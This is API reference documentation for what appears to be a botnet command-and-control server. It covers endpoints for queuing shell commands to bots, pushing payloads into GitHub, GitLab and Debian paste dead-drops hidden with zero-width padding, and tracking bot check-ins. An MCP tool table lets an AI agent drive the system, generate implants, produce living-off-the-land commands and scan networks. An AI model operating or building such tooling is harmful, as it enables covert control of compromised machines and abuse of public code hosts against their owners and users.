# API Reference

## Authentication

All endpoints except `/api/heartbeat/*` require Bearer token:
```
Authorization: Bearer <token>
```

Two roles:
- **admin**: full C2 control
- **lints**: read-only monitoring

Tokens auto-generated on first run, stored in `api_config.json`.

## Admin Endpoints (role=admin)

| Method | Path | Description |
|---|---|---|
| GET | `/api/admin/repos` | List all repos |
| POST | `/api/admin/repos` | Add repo `{"repo":"gh:user/repo"}` |
| DELETE | `/api/admin/repos/{idx}` | Remove repo |
| POST | `/api/admin/repos/check` | Health-check all repos |
| GET | `/api/admin/commands` | List queued commands |
| POST | `/api/admin/commands` | Add command `{"cmd":"shell id"}` |
| DELETE | `/api/admin/commands` | Clear all commands |
| DELETE | `/api/admin/commands/{idx}` | Remove single command |
| POST | `/api/admin/push` | Push payload `{"index":N,"pad":bool}` |
| GET | `/api/admin/pull/{idx}` | Pull payload from repo |
| GET | `/api/admin/preview` | Preview JSON payload |
| POST | `/api/admin/paste` | Create Debian paste dead-drop |
| GET | `/api/admin/heartbeat` | Get heartbeat config |
| PUT | `/api/admin/heartbeat` | Set heartbeat config |
| PUT | `/api/admin/tokens` | Set GitHub/GitLab tokens |
| PUT | `/api/admin/padding` | Toggle 1MB ZW padding |
| POST | `/api/admin/config/save` | Persist config |
| GET | `/api/admin/bots` | List all bots |
| DELETE | `/api/admin/bots/{id}` | Remove bot |
| GET | `/api/admin/stats` | Dashboard summary |

## Lints Endpoints (role=admin or lints)

| Method | Path | Description |
|---|---|---|
| GET | `/api/lints/status` | Overview stats |
| GET | `/api/lints/bots` | Bot list |
| GET | `/api/lints/repos` | Repo list |
| GET | `/api/lints/commands` | Command queue |

## Public Endpoints

| Method | Path | Description |
|---|---|---|
| GET/POST | `/api/heartbeat/{hash}` | Bot check-in |
| GET | `/api/auth/whoami` | Token validation |

## Repo Spec Format

```
owner/repo                        GitHub (default)
gh:owner/repo                     GitHub explicit
gl:owner/repo                     GitLab
dp:paste_id                       Debian paste
owner/repo:branch                 Custom branch
gl:owner/repo:main/path/file.md   Custom branch + file path
```

## MCP Tools (AI Control)

| Tool | Tier | Description |
|---|---|---|
| `list_bots` | 0 | List connected bots |
| `get_stats` | 0 | Dashboard stats |
| `list_repos` | 0 | List dead-drop repos |
| `list_commands` | 0 | Queued commands |
| `add_command` | 1 | Queue non-destructive cmd |
| `check_repos` | 1 | Health-check repos |
| `add_shell_command` | 2 | Queue shell (requires confirm) |
| `push_payload` | 2 | Push to repos |
| `add_repo` | 2 | Add dead-drop repo |
| `create_paste` | 2 | Create Debian paste |
| `lolbin_search` | 2 | Search GTFOBins catalog |
| `lolbin_generate` | 2 | Generate LOL command |
| `generate_implant` | 3 | Generate implant binary |
| `scan_network` | 3 | Network scan |
